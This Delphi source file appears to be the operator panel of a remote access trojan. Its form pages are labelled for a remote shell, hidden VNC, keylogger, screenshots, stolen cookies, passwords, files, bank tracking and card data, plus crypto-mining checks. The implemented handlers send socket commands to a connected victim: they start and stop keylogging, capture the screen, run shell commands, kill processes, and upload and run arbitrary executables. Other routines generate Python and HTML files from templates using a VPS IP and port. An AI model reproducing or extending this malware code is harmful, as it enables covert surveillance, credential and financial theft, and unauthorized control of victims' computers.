unit Unit5;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, scControls, scGPControls, DzSocket, System.NetEncoding,
  Vcl.StdCtrls, System.ImageList, Vcl.ImgList, Vcl.VirtualImageList,
  Vcl.BaseImageCollection, Vcl.ImageCollection, Vcl.ComCtrls, scGPPagers,
  Vcl.Imaging.pngimage, scGPImages, scGPExtControls, Vcl.Mask, Vcl.ExtCtrls, Winapi.WinSock2, Shellapi, IdHTTP, IdStack;

type
  TRunExecute = class(TForm)
    scGPPanel9: TscGPPanel;
    scGPButton9: TscGPButton;
    Label1: TLabel;
    Label2: TLabel;
    ImageCollection1: TImageCollection;
    VirtualImageList1: TVirtualImageList;
    scTreeView1: TscTreeView;
    scGPPageControl1: TscGPPageControl;
    AllInformation: TscGPPageControlPage;
    CPU: TscGPPageControlPage;
    GPU: TscGPPageControlPage;
    ProcessManager: TscGPPageControlPage;
    RemoteShell: TscGPPageControlPage;
    HVNC: TscGPPageControlPage;
    Keylogger: TscGPPageControlPage;
    Screenshot: TscGPPageControlPage;
    Cookies: TscGPPageControlPage;
    Passwords: TscGPPageControlPage;
    StealedFiles: TscGPPageControlPage;
    FollowBanks: TscGPPageControlPage;
    Cards: TscGPPageControlPage;
    UploadExecute: TscGPPageControlPage;
    scGPPanel13: TscGPPanel;
    Label14: TLabel;
    scGPImage5: TscGPImage;
    scGPPanel1: TscGPPanel;
    Label3: TLabel;
    scGPImage1: TscGPImage;
    informationedit: TscGPMemo;
    scGPButton10: TscGPButton;
    scGPPanel2: TscGPPanel;
    Label4: TLabel;
    scGPImage2: TscGPImage;
    miningedit: TscGPMemo;
    scGPButton1: TscGPButton;
    ProcessListBox: TscListBox;
    scGPPanel3: TscGPPanel;
    Label5: TLabel;
    scGPImage3: TscGPImage;
    scEdit3: TscEdit;
    scEdit1: TscEdit;
    scGPButton2: TscGPButton;
    scGPButton3: TscGPButton;
    scGPPanel4: TscGPPanel;
    Label6: TLabel;
    scGPImage4: TscGPImage;
    scGPButton4: TscGPButton;
    scGPButton5: TscGPButton;
    Image4: TImage;
    scGPPanel5: TscGPPanel;
    Label7: TLabel;
    scGPImage6: TscGPImage;
    KeylogMemo: TscGPMemo;
    scGPButton6: TscGPButton;
    scGPButton7: TscGPButton;
    scGPButton8: TscGPButton;
    scGPButton11: TscGPButton;
    scGPPanel6: TscGPPanel;
    Label8: TLabel;
    scGPImage7: TscGPImage;
    shelledit: TscGPMemo;
    scGPButton15: TscGPButton;
    commandedit: TscEdit;
    scGPPanel7: TscGPPanel;
    Label9: TLabel;
    scGPImage8: TscGPImage;
    Memo1: TMemo;
    Memo2: TMemo;
    scGPButton12: TscGPButton;
    flaskport: TEdit;
    Label10: TLabel;
    vpsip: TEdit;
    normalport: TEdit;
    FlaskHTMLEdit: TEdit;
    procedure scGPButton9Click(Sender: TObject);
    procedure Label2Click(Sender: TObject);
    procedure scTreeView1Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure scGPButton10Click(Sender: TObject);
    procedure scGPButton1Click(Sender: TObject);
    procedure scGPButton2Click(Sender: TObject);
    procedure scEdit1Change(Sender: TObject);
    procedure ProcessListBoxClick(Sender: TObject);
    procedure scGPButton3Click(Sender: TObject);
    procedure scGPButton4Click(Sender: TObject);
    procedure scGPButton5Click(Sender: TObject);
    procedure scGPButton6Click(Sender: TObject);
    procedure scGPButton8Click(Sender: TObject);
    procedure scGPButton11Click(Sender: TObject);
    procedure scGPButton7Click(Sender: TObject);
    procedure scGPButton15Click(Sender: TObject);
    procedure scGPButton12Click(Sender: TObject);


  private
     FCurrentSocket: TDzSocket;

        FSocket: TSocket;
           FClientSocket: TSocket;





  public

 

  property CurrentSocket: TDzSocket read FCurrentSocket write FCurrentSocket;

  end;

var
  RunExecute: TRunExecute;

implementation

{$R *.dfm}

uses Main;









procedure TRunExecute.FormCreate(Sender: TObject);
begin


informationedit.Clear;
miningedit.Clear;
 KeylogMemo.Clear;
 shelledit.Clear;

  scEdit1.Text := 'Search Processes...';


end;

procedure TRunExecute.Label2Click(Sender: TObject);
begin
Close;
end;

procedure TRunExecute.ProcessListBoxClick(Sender: TObject);
var
  SelectedItem: string;
  Parts: TArray<string>;
begin
    if ProcessListBox.ItemIndex >= 0 then
  begin
    SelectedItem := ProcessListBox.Items[ProcessListBox.ItemIndex];

    // Split by the pipe character and trim spaces
    Parts := SelectedItem.Split(['|']);
    if Length(Parts) >= 2 then // Check if we have at least 2 parts (PID and Name)
    begin
      // The name is the second part (index 1), trim spaces
      scEdit3.Text := Trim(Parts[1]);
    end;
  end;
end;

procedure TRunExecute.scEdit1Change(Sender: TObject);
var
  i: Integer;
  SearchText: string;
  ProcessParts: TArray<string>;
begin
  // Prevent unnecessary processing if no original list
  if Main.Form2.FOriginalProcessList.Count = 0 then Exit;

  // Clear the ListBox
  ProcessListBox.Clear;

  // Get the search text and convert to lowercase for case-insensitive search
  SearchText := LowerCase(Trim(scEdit1.Text));

  // Begin update to reduce flickering
  ProcessListBox.Items.BeginUpdate;
  try
    // If search text is empty, restore ALL original items
    if SearchText = '' then
    begin
      for i := 0 to Main.Form2.FOriginalProcessList.Count - 1 do
      begin
        ProcessParts := Main.Form2.FOriginalProcessList[i].Split(['|']);
        if Length(ProcessParts) >= 3 then
        begin
          ProcessListBox.Items.Add(
            Format('%-8s | %-30s | %s', [
              ProcessParts[0],   // PID
              ProcessParts[1],   // Name
              ProcessParts[2]    // Architecture
            ])
          );
        end;
      end;
    end
    else
    begin
      // Filter items based on search text
      for i := 0 to Main.Form2.FOriginalProcessList.Count - 1 do
      begin
        ProcessParts := Main.Form2.FOriginalProcessList[i].Split(['|']);
        if Length(ProcessParts) >= 3 then
        begin
          // Check if the process name contains the search text
          if Pos(SearchText, LowerCase(ProcessParts[1])) > 0 then
          begin
            ProcessListBox.Items.Add(
              Format('%-8s | %-30s | %s', [
                ProcessParts[0],   // PID
                ProcessParts[1],   // Name
                ProcessParts[2]    // Architecture
              ])
            );
          end;
        end;
      end;

      // If no results, restore all items
      if ProcessListBox.Items.Count = 0 then
      begin
        for i := 0 to Main.Form2.FOriginalProcessList.Count - 1 do
        begin
          ProcessParts := Main.Form2.FOriginalProcessList[i].Split(['|']);
          if Length(ProcessParts) >= 3 then
          begin
            ProcessListBox.Items.Add(
              Format('%-8s | %-30s | %s', [
                ProcessParts[0],   // PID
                ProcessParts[1],   // Name
                ProcessParts[2]    // Architecture
              ])
            );
          end;
        end;
      end;
    end;
  finally
    ProcessListBox.Items.EndUpdate;
  end;
end;

procedure TRunExecute.scGPButton10Click(Sender: TObject);
begin
 if (CurrentSocket <> nil) and (CurrentSocket.Connected) then
  begin
    try


            CurrentSocket.Send('1', '');

    except
      on E: Exception do
      begin
        MessageBox(Handle, PChar('Error sending socket to get all info: ' + E.Message),
                  'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  end
  else
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Close;
  end;
end;

procedure TRunExecute.scGPButton11Click(Sender: TObject);
begin
if (CurrentSocket <> nil) and (CurrentSocket.Connected) then
  begin
    try


            CurrentSocket.Send('8', '');

    except
      on E: Exception do
      begin
        MessageBox(Handle, PChar('Error sending socket for keylogger: ' + E.Message),
                  'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  end
  else
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Close;
  end;
end;



function GetRandomString(Size: Integer): string;
var
  i: Integer;
  RandStr: string;
begin
  RandStr := '';
  Randomize;

  for i := 1 to Size do
  begin
    // Add random letters (both uppercase and lowercase)
    case Random(3) of
      0: RandStr := RandStr + Char(Ord('A') + Random(26));  // Uppercase
      1: RandStr := RandStr + Char(Ord('a') + Random(26));  // Lowercase
      2: RandStr := RandStr + Char(Ord('0') + Random(10));  // Numbers
    end;
  end;

  Result := RandStr;
end;


  var
  FlaskName : string;
  FlaskFilePath : string;
 procedure SaveHTMLFlaskContents(Memo: TMemo;
                                  const Text1: string; const Replace1: string;
                                  const Text2: string; const Replace2: string);
var
  TempStrings: TStringList;
  i: Integer;
begin

  TempStrings := TStringList.Create;
  try

    TempStrings.LineBreak := #13#10;
    TempStrings.Text := Memo.Lines.Text;


    for i := 0 to TempStrings.Count - 1 do
    begin
      if (Text1 <> '') and (Replace1 <> '') then
        TempStrings[i] := StringReplace(TempStrings[i], Text1, Replace1, [rfReplaceAll]);
      if (Text2 <> '') and (Replace2 <> '') then
        TempStrings[i] := StringReplace(TempStrings[i], Text2, Replace2, [rfReplaceAll]);
    end;


    FlaskName := GetRandomString(8) + '.html';
    Unit5.RunExecute.FlaskHTMLEdit.Text := FlaskName;


    FlaskFilePath := ExtractFilePath(ParamStr(0)) + FlaskName;


    TempStrings.SaveToFile(FlaskFilePath);


    MessageBox(Application.Handle,
               PChar('HTML file saved successfully as: ' + FlaskFilePath),
               'Save Complete', MB_OK or MB_ICONINFORMATION);
  finally
    TempStrings.Free;
  end;
end;
var
FilePath: string;
 FileName: string;

procedure SaveMemoWithReplacements(Memo: TMemo;
                                  const Text1: string; const Replace1: string;
                                  const Text2: string; const Replace2: string;
                                  const Text3: string; const Replace3: string;
                                  const Text4: string; const Replace4: string);
var
  TempStrings: TStringList; // Use TStringList instead of TMemo

  i: Integer;
begin
  // Use TStringList for text manipulation
  TempStrings := TStringList.Create;
  try
    // Copy all lines from the memo
    TempStrings.Assign(Memo.Lines);

    // Process each line for replacements
    for i := 0 to TempStrings.Count - 1 do
    begin
      // First replacement
      if (Text1 <> '') and (Replace1 <> '') then
        TempStrings[i] := StringReplace(TempStrings[i], Text1, Replace1, [rfReplaceAll]);

      // Second replacement
      if (Text2 <> '') and (Replace2 <> '') then
        TempStrings[i] := StringReplace(TempStrings[i], Text2, Replace2, [rfReplaceAll]);

      // Third replacement
      if (Text3 <> '') and (Replace3 <> '') then
        TempStrings[i] := StringReplace(TempStrings[i], Text3, Replace3, [rfReplaceAll]);


     if (Text4 <> '') and (Replace4 <> '') then
        TempStrings[i] := StringReplace(TempStrings[i], Text4, Replace4, [rfReplaceAll]);
    end;

    // Generate a random filename with .py extension
    FileName := GetRandomString(8) + '.py';

    // Get the application's current directory
    FilePath := ExtractFilePath(ParamStr(0)) + FileName;

    // Save the modified text to the file
    TempStrings.SaveToFile(FilePath);

    // Show confirmation message
    MessageBox(Application.Handle,
               PChar('Python file saved successfully as: ' + FilePath),
               'Save Complete', MB_OK or MB_ICONINFORMATION);
  finally
    TempStrings.Free;
  end;
end;

 function Random4Digits: Integer;
begin
  Result := 1000 + Random(9000);
end;

// Generate a random port around 20000 (20000-24999)
function RandomPortAround20000: Integer;
begin
  Result := 20000 + Random(5000);
end;



function GetMyIPAddress: string;
var
  IdHTTP: TIdHTTP;
begin
  Result := '';
  IdHTTP := TIdHTTP.Create(nil);
  try
    IdHTTP.ConnectTimeout := 3000;
    IdHTTP.ReadTimeout := 3000;
    try

      Result := IdHTTP.Get('http://api.ipify.org');
    except

      try
        Result := IdHTTP.Get('http://checkip.amazonaws.com').Trim;
      except
        on E: Exception do
          Result := '';
      end;
    end;
  finally
    IdHTTP.Free;
  end;
end;

procedure TRunExecute.scGPButton12Click(Sender: TObject);
var
  AlreadyGenerated: Boolean;
begin

end;

procedure TRunExecute.scGPButton15Click(Sender: TObject);
begin

  if (CurrentSocket <> nil) and (CurrentSocket.Connected) then
  begin
    try

                if Assigned(CommandEdit) and (Trim(CommandEdit.Text) <> '') then
  begin

    shelledit.Lines.Add('>: ' + CommandEdit.Text);


  end;
      CurrentSocket.Send('S', CommandEdit.Text);


    except
      on E: Exception do
      begin
        MessageBox(Handle, PChar('Error sending retrieve process list: ' + E.Message),
                  'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  end
  else
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Close;
  end;
end;

procedure TRunExecute.scGPButton1Click(Sender: TObject);
begin
 if (CurrentSocket <> nil) and (CurrentSocket.Connected) then
  begin
    try


            CurrentSocket.Send('3', '');

    except
      on E: Exception do
      begin
        MessageBox(Handle, PChar('Error sending socket to get all info: ' + E.Message),
                  'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  end
  else
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Close;
  end;
end;

procedure TRunExecute.scGPButton2Click(Sender: TObject);
begin

  if (CurrentSocket <> nil) and (CurrentSocket.Connected) then
  begin
    try
      CurrentSocket.Send('/', '');


    except
      on E: Exception do
      begin
        MessageBox(Handle, PChar('Error sending retrieve process list: ' + E.Message),
                  'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  end
  else
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Close;
  end;

end;


procedure TRunExecute.scGPButton3Click(Sender: TObject);
var
  SelectedItem: string;
  Parts: TArray<string>;
  ProcessName: string;
begin

   if ProcessListBox.ItemIndex >= 0 then
  begin
    // Get the selected text
    SelectedItem := ProcessListBox.Items[ProcessListBox.ItemIndex];

    // Split by pipe character and get the process name (second part)
    Parts := SelectedItem.Split(['|']);
    if Length(Parts) >= 2 then
    begin
      // Extract process name (the second part after splitting)
      ProcessName := Trim(Parts[1]);
      scEdit3.Text := ProcessName;

      // Send data via socket
      if (CurrentSocket <> nil) and (CurrentSocket.Connected) then
      begin
        try
          CurrentSocket.Send('L', scEdit3.Text);
        except
          on E: Exception do
          begin
            MessageBox(Handle, PChar('Error sending kill process: ' + E.Message),
                      'Error', MB_ICONERROR or MB_OK);
          end;
        end;
      end
      else
      begin
        MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
        Close;
      end;

      // Clear list and send refresh request
      if (CurrentSocket <> nil) and (CurrentSocket.Connected) then
      begin
        try
          ProcessListBox.Items.Clear;
          CurrentSocket.Send('/', '');
        except
          on E: Exception do
          begin
            MessageBox(Handle, PChar('Error sending retrieve process list: ' + E.Message),
                      'Error', MB_ICONERROR or MB_OK);
          end;
        end;
      end
      else
      begin
        MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
        Close;
      end;
    end;
  end;
end;

procedure TRunExecute.scGPButton4Click(Sender: TObject);
begin
if (CurrentSocket <> nil) and (CurrentSocket.Connected) then
  begin
    try


      CurrentSocket.Send('G', '');
    except
      on E: Exception do
      begin

      end;
    end;
  end
  else
  begin

    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Close;
  end;
end;

procedure TRunExecute.scGPButton5Click(Sender: TObject);
var
  SaveDialog: TSaveDialog;
begin
      if Image4.Picture.Graphic = nil then
  begin
    MessageBox(Handle, 'No screenshot to save.', 'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  // Create save dialog
  SaveDialog := TSaveDialog.Create(Self);
  try
    SaveDialog.Title := 'Save Screenshot';
    SaveDialog.DefaultExt := 'jpg';
    SaveDialog.Filter := 'JPEG Image (*.jpg)|*.jpg';
    SaveDialog.Options := [ofOverwritePrompt, ofHideReadOnly, ofEnableSizing];

    // Show the dialog and save if user clicks OK
    if SaveDialog.Execute then
    begin
      try
        Image4.Picture.SaveToFile(SaveDialog.FileName);
        MessageBox(Handle, PChar('Screenshot saved to: ' + SaveDialog.FileName),
                  'Success', MB_ICONINFORMATION or MB_OK);
      except
        on E: Exception do
          MessageBox(Handle, PChar('Error saving screenshot: ' + E.Message),
                    'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  finally
    SaveDialog.Free;
  end;
end;

procedure TRunExecute.scGPButton6Click(Sender: TObject);
begin

scGPButton8.Enabled := true;
            scGPButton6.Enabled := false;
if (CurrentSocket <> nil) and (CurrentSocket.Connected) then
  begin
    try


            CurrentSocket.Send('K', '');

    except
      on E: Exception do
      begin
        MessageBox(Handle, PChar('Error sending socket for keylogger: ' + E.Message),
                  'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  end
  else
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Close;
  end;
end;

procedure TRunExecute.scGPButton7Click(Sender: TObject);
var
  SaveDialog: TSaveDialog;
begin
  // Create a save file dialog
  SaveDialog := TSaveDialog.Create(nil);
  try
    // Configure dialog properties
    SaveDialog.Title := 'Save Keylog Data';
    SaveDialog.DefaultExt := 'txt';
    SaveDialog.Filter := 'Text files (*.txt)|*.txt|All files (*.*)|*.*';
    SaveDialog.Options := [ofOverwritePrompt, ofHideReadOnly, ofEnableSizing];

    // Show the dialog and check if the user clicked OK
    if SaveDialog.Execute then
    begin
      try
        // Save the KeylogMemo contents to the chosen file
        KeylogMemo.Lines.SaveToFile(SaveDialog.FileName);

        // Optional: Show a success message
        MessageDlg('Keylog data saved successfully to: ' + SaveDialog.FileName,
                  mtInformation, [mbOK], 0);
      except
        on E: Exception do
          // Show error message if file saving fails
          MessageDlg('Error saving file: ' + E.Message, mtError, [mbOK], 0);
      end;
    end;
  finally
    // Always free the SaveDialog
    SaveDialog.Free;
  end;
end;

procedure TRunExecute.scGPButton8Click(Sender: TObject);
begin

scGPButton8.Enabled := false;
            scGPButton6.Enabled := true;
if (CurrentSocket <> nil) and (CurrentSocket.Connected) then
  begin
    try


            CurrentSocket.Send('9', '');

    except
      on E: Exception do
      begin
        MessageBox(Handle, PChar('Error sending socket for keylogger info: ' + E.Message),
                  'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  end
  else
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Close;
  end;
end;

procedure TRunExecute.scGPButton9Click(Sender: TObject);
var
  OpenDialog: TOpenDialog;
  FileStream: TFileStream;
  ByteArray: TBytes;
  Base64Str: string;
  FileName: string;
  Counter: Integer;
begin
      if (CurrentSocket = nil) or (not CurrentSocket.Connected) then
  begin
    MessageBox(Handle, 'Client is not connected.', 'Error', MB_ICONERROR or MB_OK);
    Exit;
  end;

  OpenDialog := TOpenDialog.Create(Self);
  try
    OpenDialog.Title := 'Select file to upload and execute';
    OpenDialog.Filter := 'Executable files (*.exe)|*.exe|All files (*.*)|*.*';

    if OpenDialog.Execute then
    begin
      // Extract just the filename without path
      FileName := ExtractFileName(OpenDialog.FileName);

      try
        // Read the file into a byte array
        FileStream := TFileStream.Create(OpenDialog.FileName, fmOpenRead);
        try
          // Check file size
          if FileStream.Size > 50 * 1024 * 1024 then // 50 MB limit
          begin
            MessageBox(Handle, 'File is too large. Maximum size is 50 MB.',
                       'Error', MB_ICONERROR or MB_OK);
            Exit;
          end;

          // Read the file data
          SetLength(ByteArray, FileStream.Size);
          FileStream.ReadBuffer(ByteArray[0], FileStream.Size);

          // Convert to Base64
          Base64Str := TNetEncoding.Base64.EncodeBytesToString(ByteArray);

          // Send the command, filename, and Base64 data
          // 'U' command for Upload and Execute
          CurrentSocket.Send('U', FileName + '|' + Base64Str);

          MessageBox(Handle, PChar('File "' + FileName + '" sent to client.'),
                     'Upload Success', MB_ICONINFORMATION or MB_OK);


          Counter := StrToIntDef(Main.Form2.Label6.Caption, 0);
          // Increment counter
          Counter := Counter + 1;
          // Update the label with new value
          Main.Form2.Label6.Caption := IntToStr(Counter);
        finally
          FileStream.Free;
        end;
      except
        on E: Exception do
          MessageBox(Handle, PChar('Error sending file: ' + E.Message),
                     'Error', MB_ICONERROR or MB_OK);
      end;
    end;
  finally
    OpenDialog.Free;
  end;
end;

procedure TRunExecute.scTreeView1Click(Sender: TObject);
var
  Node: TTreeNode;
begin

  Node := scTreeView1.Selected;


  if Node = nil then
    Exit;



      if (Node.Text = 'Mining Compatible') and
     (Node.Parent <> nil) and
     (Node.Parent.Text = 'System Info') then
  begin

    scGPPageControl1.TabIndex := 2;

  end;


  if (Node.Text = 'All Information') and
     (Node.Parent <> nil) and
     (Node.Parent.Text = 'System Info') then
  begin

    scGPPageControl1.TabIndex := 0;

  end;






        if (Node.Text = 'HVNC') and
     (Node.Parent <> nil) and
     (Node.Parent.Text = 'Spy') then
  begin

    scGPPageControl1.TabIndex := 5;

  end;



        if (Node.Text = 'Keylogger') and
     (Node.Parent <> nil) and
     (Node.Parent.Text = 'Spy') then
  begin

    scGPPageControl1.TabIndex := 6;

  end;


       if (Node.Text = 'Screenshot') and
     (Node.Parent <> nil) and
     (Node.Parent.Text = 'Spy') then
  begin

    scGPPageControl1.TabIndex := 7;

  end;






     if (Node.Text = 'Remote Shell') and
     (Node.Parent <> nil) and
     (Node.Parent.Text = 'System Functions') then
  begin

    scGPPageControl1.TabIndex := 4;

  end;



     if (Node.Text = 'Process Manager') and
     (Node.Parent <> nil) and
     (Node.Parent.Text = 'System Functions') then
  begin

    scGPPageControl1.TabIndex := 3;

  end;



  if (Node.Text = 'Upload - Execute') and
     (Node.Parent <> nil) and
     (Node.Parent.Text = 'Remote Execute') then
  begin

    scGPPageControl1.TabIndex := 13;

  end;
end;

end.
